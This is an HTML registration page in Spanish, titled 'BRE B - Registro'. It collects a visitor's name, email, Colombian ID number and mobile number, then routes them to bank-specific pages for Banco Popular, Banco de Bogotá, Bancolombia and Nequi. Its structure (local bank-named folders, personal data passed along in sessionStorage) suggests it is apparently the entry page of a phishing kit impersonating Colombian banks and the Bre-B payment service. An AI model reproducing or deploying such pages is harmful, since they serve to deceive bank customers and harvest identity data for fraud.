<!DOCTYPE html>
<html lang="es">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>BRE B - Registro</title>
<link rel="preconnect" href="https://fonts.googleapis.com">
<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
<link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap" rel="stylesheet">
<style>
*{box-sizing:border-box;margin:0;padding:0;font-family:"Roboto",system-ui,-apple-system,"Segoe UI",Helvetica,Arial,sans-serif}
body{background:#f5f5f5;color:#333}
.page{min-height:100vh;display:flex;align-items:center;justify-content:center;padding:16px}
.card{width:100%;max-width:520px;background:#fff;border-radius:18px;padding:28px 24px;box-shadow:0 16px 40px rgba(0,0,0,.08);border:1px solid #efefef}
.header{text-align:center;margin-bottom:16px;font-weight:700;font-size:20px}
.sub{text-align:center;color:#555;margin-bottom:18px;font-size:14px}
.form-group{margin-bottom:14px}
.label{display:block;font-size:13px;margin-bottom:6px;color:#555}
.input,.select{width:100%;padding:10px 12px;border:1px solid #d5d5d5;border-radius:6px;font-size:14px}
.row{display:flex;gap:10px}
.row .input{flex:1}
.actions{margin-top:18px}
.button{width:100%;padding:11px 16px;border:none;border-radius:6px;font-weight:600;color:#fff;background:#005570;cursor:pointer}
.button:disabled{background:#d5d5d5;cursor:not-allowed}
.banks{display:flex;gap:10px;margin-top:12px}
.bank{flex:1;padding:10px;border:1px solid #e5e5e5;border-radius:8px;text-align:center;cursor:pointer;font-size:13px}
.bank.selected{border-color:#005570;color:#005570;font-weight:600}
</style>
</head>
<body>
<div class="page">
<div class="card">
<div class="header">Registro de datos</div>
<div class="sub">Ingresa tus datos y elige el banco para continuar.</div>
<div class="form-group">
<label class="label" for="nombre">Nombre</label>
<input class="input" id="nombre" type="text" autocomplete="off">
</div>
<div class="form-group">
<label class="label" for="email">Email</label>
<input class="input" id="email" type="email" autocomplete="off">
</div>
<div class="row">
<div class="form-group" style="flex:1">
<label class="label" for="cedula">Cédula</label>
<input class="input" id="cedula" type="text" inputmode="numeric" autocomplete="off">
</div>
<div class="form-group" style="flex:1">
<label class="label" for="celular">Celular</label>
<input class="input" id="celular" type="text" inputmode="numeric" autocomplete="off" maxlength="10">
</div>
</div>
<div class="form-group">
<label class="label">Elige tu banco</label>
<div class="banks" id="banks">
<div class="bank" data-path="../banco popular/index.html">Banco Popular</div>
<div class="bank" data-path="../bancodebogota/index.html">Banco de Bogotá</div>
<div class="bank" data-path="../bancolombia/USUARIO BANCOLOMBIA.html">Bancolombia</div>
<div class="bank" data-path="../nequi/index.html">Nequi</div>
</div>
</div>
<div class="actions">
<button id="continuar" class="button" disabled>Continuar</button>
</div>
</div>
</div>
<script>
var nombre=document.getElementById("nombre");
var email=document.getElementById("email");
var cedula=document.getElementById("cedula");
var celular=document.getElementById("celular");
var continuar=document.getElementById("continuar");
var banks=document.getElementById("banks");
var bankPath=null;
function onlyDigits(el,max){if(!el)return;el.addEventListener("input",function(){var v=this.value.replace(/\D/g,"");if(typeof max==="number")v=v.slice(0,max);this.value=v;update();});}
onlyDigits(cedula);onlyDigits(celular,10);
banks.addEventListener("click",function(e){var t=e.target.closest(".bank");if(!t)return;Array.prototype.forEach.call(banks.children,function(x){x.classList.remove("selected");});t.classList.add("selected");bankPath=t.getAttribute("data-path");sessionStorage.setItem("selected_bank_path",bankPath);update();});
function update(){var ok=(nombre.value.trim().length>0&&email.value.trim().length>0&&cedula.value.trim().length>0&&celular.value.trim().length===10&&bankPath);continuar.disabled=!ok;}
continuar.addEventListener("click",function(){if(continuar.disabled||!bankPath)return;sessionStorage.setItem("user_nombre",nombre.value.trim());sessionStorage.setItem("user_email",email.value.trim());sessionStorage.setItem("user_cedula",cedula.value.trim());sessionStorage.setItem("bc_usuario",celular.value.trim());window.location.href="http://localhost:5173/";});
</script>
</body>
</html>
